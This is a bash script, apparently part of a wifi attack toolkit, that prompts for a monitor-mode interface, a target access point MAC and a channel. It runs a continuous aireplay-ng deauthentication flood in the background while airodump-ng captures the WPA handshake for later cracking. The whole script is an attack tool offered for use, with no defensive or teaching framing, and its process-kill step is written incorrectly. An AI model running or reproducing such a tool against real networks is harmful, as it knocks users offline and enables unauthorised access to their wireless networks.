#!/bin/bash

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
echo ""

cat handshake.txt

echo ""
iwconfig
echo ""

echo -e "${blue}write your ${red}!exact!${clear} wifi card name which is in monitor mode:${clear} or type 'exit' to go in main menu"
echo "---------------------------------------------------"
echo ""
read -p "intefacename>>" name

if [ ${name} = "exit" ];
then
bash ./armazi.sh
fi

read -p "targetMAC>>" mac


read -p "targetChannel(CH)>>" ch

echo -e "${red}now you will see monitored ${mac} divice you can hit Ctrl+C when you see handsake captured${clear}"

sleep 5

echo ""

air() {
  nohup aireplay-ng -0 0 -a ${mac} ${name} &
  airodump-ng -w handshake/hack -c ${ch} --bssid ${mac} ${name}
  id= pgrep -w aireplay-ng
  kill id
  bash ./armazi.sh
}

x=$(ifconfig -a | sed 's/[ \t].*//;/^$/d')

if [[ $x == *"$name"* ]]; then
    air

  elif [ $name = "exit" ]; 
    then
    bash ./armazi.sh

  else
    echo -e "${red}there is no card named $name !!!${clear}"
    bash handshake.sh
fi